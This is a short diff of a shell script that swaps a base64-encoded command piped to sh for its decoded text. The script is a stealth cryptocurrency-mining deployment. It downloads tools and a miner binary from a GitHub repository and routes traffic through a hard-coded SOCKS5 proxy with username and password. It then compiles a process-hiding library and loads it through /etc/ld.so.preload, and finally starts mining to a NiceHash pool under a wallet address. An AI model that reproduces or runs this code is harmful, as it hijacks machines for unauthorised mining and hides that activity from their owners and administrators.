@@ -1,1 +1,45 @@
-base64 -d <<< IyEvYmluL3NoCmxuIC1mcyAvdXNyL3NoYXJlL3pvbmVpbmZvL0FmcmljYS9Kb2hhbm5lc2J1cmcgL2V0Yy9sb2NhbHRpbWUKZHBrZy1yZWNvbmZpZ3VyZSAtLWZyb250ZW5kIG5vbmludGVyYWN0aXZlIHR6ZGF0YQoKYXB0IHVwZGF0ZSAteTthcHQgLXkgaW5zdGFsbCBiaW51dGlscyBjbWFrZSBidWlsZC1lc3NlbnRpYWwgc2NyZWVuIHVuemlwIG5ldC10b29scyBjdXJsCgp3Z2V0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9uYXRoYW5mbGVpZ2h0L3NjcmlwdHMvbWFpbi9ncmFwaGljcy50YXIuZ3oKCnRhciAteHZ6ZiBncmFwaGljcy50YXIuZ3oKCmNhdCA+IGdyYWZ0Y3AvbG9jYWwvZ3JhZnRjcC1sb2NhbC5jb25mIDw8RU5EIGxpc3RlbiA9IDoyMjMzIGxvZ2xldmVsID0gMSAKc29ja3M1ID0gNDUuMTQyLjI4LjIwOjgwMzEKc29ja3M1X3VzZXJuYW1lID0gYnBhYm9uZ3QKc29ja3M1X3Bhc3N3b3JkID0gd3EzeXhvZjI2eHNoCkVORAoKLi9ncmFmdGNwL2xvY2FsL2dyYWZ0Y3AtbG9jYWwgLWNvbmZpZyBncmFmdGNwL2xvY2FsL2dyYWZ0Y3AtbG9jYWwuY29uZiAmCgpzbGVlcCAuMgoKZWNobyAiICIKZWNobyAiICIKCmVjaG8gIiIKCi4vZ3JhZnRjcC9ncmFmdGNwIGN1cmwgaWZjb25maWcubWUKCmVjaG8gIiAiCmVjaG8gIiAiCgplY2hvICIiCgplY2hvICIgIgplY2hvICIgIgoKLi9ncmFmdGNwL2dyYWZ0Y3Agd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbmF0aGFuZmxlaWdodC9zY3JpcHRzL21haW4vYmV6ekhhc2gKY2htb2QgK3ggYmV6ekhhc2gKCi4vZ3JhZnRjcC9ncmFmdGNwIHdnZXQgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25hdGhhbmZsZWlnaHQvc2NyaXB0cy9tYWluL21hZ2ljQmV6ekhhc2guemlwCnVuemlwIG1hZ2ljQmV6ekhhc2guemlwCm1ha2UKZ2NjIC1XYWxsIC1mUElDIC1zaGFyZWQgLW8gbGlicHJvY2Vzc2hpZGVyLnNvIHByb2Nlc3NoaWRlci5jIC1sZGwKbXYgbGlicHJvY2Vzc2hpZGVyLnNvIC91c3IvbG9jYWwvbGliLwplY2hvIC91c3IvbG9jYWwvbGliL2xpYnByb2Nlc3NoaWRlci5zbyA+PiAvZXRjL2xkLnNvLnByZWxvYWQKLi9ncmFmdGNwL2dyYWZ0Y3AgLi9iZXp6SGFzaCAtLXVybD1zc2w6Ly8zRG5YZ2ttUmtYb3ZZajZ0ZUhXbUpXQmR0aVRUVlBqNUI0QGRhZ2dlcmhhc2hpbW90by51c2Etd2VzdC5uaWNlaGFzaC5jb206MzMzNTMgLS1sb2cgLS1leHRyYSAtLWxhdGVuY3kgLS1hbGwtc2hhcmVzIC0tc2hhcmVzLWRldGFpbCAtLXNob3ctbW9kZSAtLWxpc3QtbW9kZXMgLS1tb2RlPTk5 | sh 
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END listen = :2233 loglevel = 1 
+socks5 = 45.142.28.20:8031
+socks5_username = bpabongt
+socks5_password = wq3yxof26xsh
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+./graftcp/graftcp ./bezzHash --url=ssl://3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
